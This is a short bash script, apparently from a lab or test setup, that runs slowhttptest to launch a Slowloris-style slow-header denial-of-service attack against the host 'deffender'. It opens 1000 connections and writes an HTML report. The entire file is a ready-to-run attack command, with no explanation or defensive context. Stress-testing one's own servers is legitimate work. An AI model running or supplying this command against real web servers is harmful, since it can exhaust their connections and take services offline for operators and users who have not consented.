#!/bin/bash
slowhttptest -c 1000 -H -g -o slowloris.html -i 10 -r 200 -t GET -u http://deffender/ -x 24